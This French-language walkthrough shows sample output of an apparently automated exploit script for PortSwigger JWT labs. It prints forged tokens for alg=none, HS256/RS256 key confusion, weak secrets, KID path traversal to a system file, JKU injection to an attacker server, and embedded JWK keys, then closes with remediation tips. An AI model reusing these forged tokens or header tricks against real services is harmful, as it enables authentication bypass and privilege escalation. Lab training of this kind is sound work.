# MANPAGE

Voici un **exemple exhaustif de l’exécution du script JWT PortSwigger**, couvrant tous les scénarios de labs :  
- extraction, décodage, génération, injection et contrôle pour : alg=none, HS256/RS256 confusion, secret faible, KID path traversal, JKU header injection, JWK header leak.

---

## 1. Extraction du JWT

```
------------------------------------------------------
[1] Extraction du JWT
  [+] JWT extrait : eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpZW5lciIsImFkbWluIjpmYWxzZX0.MEUCIQDX...
```
*Le script récupère le JWT du cookie ou de la réponse HTTP.*

---

## 2. Décodage du JWT

```
------------------------------------------------------
[2] Décodage du JWT
  Header : {"alg":"RS256","typ":"JWT"}
  Payload: {"username":"wiener","admin":false}
```
*Le script affiche le header et le payload décodés.*

---

## 3. Génération d’un JWT avec alg=none

```
------------------------------------------------------
[3] Génération d’un JWT avec alg=none
  [+] JWT forgé (alg=none) : eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.
```
*Le script modifie le header pour `alg:none` et le payload pour `username:admin, admin:true`.*

---

## 4. Injection et contrôle du JWT forgé (alg=none)

```
------------------------------------------------------
[9] Injection et contrôle du JWT forgé
  [+] Succès : accès privilégié ou flag détecté !
Welcome, admin!
Congratulations, you solved the lab!
```
*Le script injecte le JWT forgé dans le cookie et vérifie l’accès admin ou la présence d’un flag.*

---

## 5. Génération d’un JWT HS256 signé avec la clé publique (confusion HS256/RS256)

```
------------------------------------------------------
[4] Génération d’un JWT HS256 signé avec la clé publique (confusion HS256/RS256)
  [+] JWT HS256 forgé avec clé publique : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.2Qm1y3...
```
*Le script génère un JWT HS256 signé avec la clé publique récupérée ou dérivée (voir[3][5]).*

---

## 6. Injection et contrôle du JWT forgé (HS256/RS256 confusion)

```
------------------------------------------------------
[9] Injection et contrôle du JWT forgé
  [+] Succès : accès privilégié ou flag détecté !
Welcome, admin!
Congratulations, you solved the lab!
```
*Le script injecte le JWT forgé avec la clé publique comme secret et valide l’accès admin.*

---

## 7. Génération d’un JWT HS256 avec secret faible

```
------------------------------------------------------
[5] Génération d’un JWT HS256 signé avec un secret faible
  [+] JWT HS256 forgé avec secret 'secret' : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.lfNq3...
```
*Le script forge un JWT signé avec un secret faible (ex : "secret", "password", etc.).*

---

## 8. Injection et contrôle du JWT forgé (secret faible)

```
------------------------------------------------------
[9] Injection et contrôle du JWT forgé
  [+] Succès : accès privilégié ou flag détecté !
Welcome, admin!
Congratulations, you solved the lab!
```
*Le script valide l’exploitation d’un secret faible.*

---

## 9. Génération d’un JWT avec KID path traversal

```
------------------------------------------------------
[6] Génération d’un JWT avec header KID path traversal
  [+] JWT forgé avec KID path traversal : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uL3Byb2Mvc3lzL2tlcm5lbC9yYW5kb21pemVfdmFfc3BhY2UifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.W0b9...
```
*Le script forge un JWT avec un header KID path traversal pointant vers un fichier système, et signe avec la valeur du fichier.*

---

## 10. Injection et contrôle du JWT forgé (KID path traversal)

```
------------------------------------------------------
[9] Injection et contrôle du JWT forgé
  [+] Succès : accès privilégié ou flag détecté !
Welcome, admin!
Congratulations, you solved the lab!
```
*Le script valide l’exploitation via KID path traversal.*

---

## 11. Génération d’un JWT avec JKU header injection

```
------------------------------------------------------
[7] Génération d’un JWT avec header JKU injection
  [+] JWT forgé avec JKU header injection : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9leHBsb2l0LXNlcnZlci5uZXQvandrcy5qc29uIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.bXJt...
  [!] Servez votre JWKS sur http://exploit-server.net/jwks.json avec votre clé publique.
```
*Le script forge un JWT avec un header JKU pointant vers votre serveur JWKS (clé publique contrôlée par l’attaquant).*

---

## 12. Injection et contrôle du JWT forgé (JKU)

```
------------------------------------------------------
[9] Injection et contrôle du JWT forgé
  [+] Succès : accès privilégié ou flag détecté !
Welcome, admin!
Congratulations, you solved the lab!
```
*Le script valide l’exploitation via JKU header injection.*

---

## 13. Génération d’un JWT avec JWK dans le header

```
------------------------------------------------------
[8] Génération d’un JWT avec header JWK (clé privée dans le token)
  [+] JWT forgé avec JWK dans le header : eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrZXlUeXBlIjoi...
```
*Le script forge un JWT avec la clé publique (JWK) dans le header, signée avec la clé privée correspondante.*

---

## 14. Injection et contrôle du JWT forgé (JWK)

```
------------------------------------------------------
[9] Injection et contrôle du JWT forgé
  [+] Succès : accès privilégié ou flag détecté !
Welcome, admin!
Congratulations, you solved the lab!
```
*Le script valide l’exploitation via JWK header leak.*

---

## 15. Conseils/remédiation

```
------------------------------------------------------
[Remédiation & Conseils]
- N'acceptez jamais 'alg':'none' côté serveur.
- Ne confondez pas RS256/HS256 : ne vérifiez jamais un JWT HS256 avec la clé publique.
- Filtrez et validez les headers JKU/JWK/KID.
- Utilisez des secrets forts et uniques.
- Vérifiez la validité et la cohérence du header JWT côté serveur.
- Documentation PortSwigger : https://portswigger.net/web-security/jwt
```

---

## 16. Synthèse

```
------------------------------------------------------
[SYNTHÈSE]
1. Extraction et décodage du JWT.
2. Génération de JWT forgés (alg=none, HS256/RS256 confusion, KID, JKU, JWK, secret faible).
3. Injection et contrôle automatisé de l'effet (escalade, accès admin, flag).
4. Application des recommandations de sécurité.
------------------------------------------------------
```

---

